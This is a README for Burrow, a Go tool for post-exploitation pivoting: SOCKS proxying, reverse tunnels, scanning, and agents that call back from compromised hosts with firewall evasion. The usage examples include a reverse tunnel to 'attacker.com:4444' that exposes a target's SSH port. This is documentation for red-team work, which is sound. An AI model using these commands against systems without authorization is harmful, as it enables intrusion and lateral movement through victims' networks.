# Burrow

Network pivoting, tunneling, and agent management. v2.0.0.

## Overview

Burrow is a static Go binary for post-exploitation network traversal. It combines SOCKS5 proxying, local/remote/reverse TCP port forwarding, multi-hop pivot chains, and subnet scanning from v1 with new agent-based pivoting: TUN interface with magic IP routing, WebSocket transport for firewall evasion, multiplexed sessions via yamux, an embedded WebUI dashboard, and userspace TCP/IP via gvisor netstack for transparent network access through compromised hosts.

All tunnel traffic is encrypted with X25519 key exchange and ChaCha20-Poly1305 or AES-256-GCM. Agent connections use TLS with certificate fingerprint verification.

## Install / Build

Requires Go 1.23+. A pre-built linux/amd64 binary is in `build/`.

```bash
# Use pre-built binary
./build/burrow --help

# Or build from source
make build          # produces build/burrow

# Manual build (no Make)
~/go-sdk/go/bin/go build -ldflags="-s -w" -o burrow .
```

## Usage

### Standalone Tools (v1 features)

```bash
# SOCKS5 proxy
burrow proxy socks5 --listen 127.0.0.1:1080
burrow proxy socks5 --listen 0.0.0.0:9050 --auth user:pass

# Local port forward
burrow tunnel local --listen 127.0.0.1:8080 --remote 10.0.0.5:80

# Remote port forward
burrow tunnel remote --listen 0.0.0.0:9090 --remote 192.168.1.10:22

# Reverse tunnel with auto-reconnect
burrow tunnel reverse --connect attacker.com:4444 --forward 127.0.0.1:22

# Multi-hop pivot chain
burrow pivot --target 10.0.0.1 --port 8443

# Network discovery
burrow scan --subnet 10.0.0.0/24
```

### Agent Mode (v2 features)

```bash
# Start proxy server (operator side) -- auto-generates TLS cert
burrow server
burrow server --listen 0.0.0.0:11601 --webui
burrow server --ws --listen 0.0.0.0:443

# Connect agent back to proxy server (target side)
burrow agent --server 10.0.0.1:11601
burrow agent --server 10.0.0.1:11601 --fingerprint SHA256:abc123...
burrow agent --ws --server https://10.0.0.1:443

# Session management
burrow session list
burrow session info <id>
burrow session use <id>
```

## Testing

```bash
~/go-sdk/go/bin/go test ./...
```

156 tests pass across 15 packages.

## Architecture

```
cmd/burrow/cmd/          CLI (cobra) -- proxy, tunnel, server, agent, session, scan
internal/
  crypto/                X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM frame encryption
  proxy/                 SOCKS5 server (RFC 1928)
  tunnel/                Local, remote, and reverse TCP forwarders
  pivot/                 Multi-hop chain orchestration
  discovery/             Ping sweep + port scanner
  certgen/               Self-signed TLS cert generation (Ed25519) + SHA256 fingerprint
  transport/             WebSocket transport over HTTP/HTTPS (nhooyr.io/websocket)
  mux/                   yamux stream multiplexer for agent sessions
  protocol/              Binary message protocol (12 types, JSON payloads, 1MB max)
  session/               Agent session manager + proxy server + web.SessionProvider
  tun/                   TUN interface with magic IP 240.0.0.0/4 routing
  udp/                   UDP port forwarding with per-client tracking
  netstack/              gvisor userspace TCP/IP for agent-side packet termination
  web/                   Embedded WebUI (Alpine.js + Pico CSS) with REST API + SSE
```

See ARCHITECTURE.md for detailed data flow and design decisions.

## Tech Stack

- Go 1.24+
- github.com/spf13/cobra (CLI)
- golang.org/x/crypto (X25519, ChaCha20-Poly1305, HKDF)
- github.com/hashicorp/yamux (stream multiplexing)
- nhooyr.io/websocket (WebSocket transport)
- github.com/songgao/water (TUN interface)
- github.com/nicocha30/gvisor-ligolo (userspace TCP/IP netstack)
- Module: github.com/loudmumble/burrow
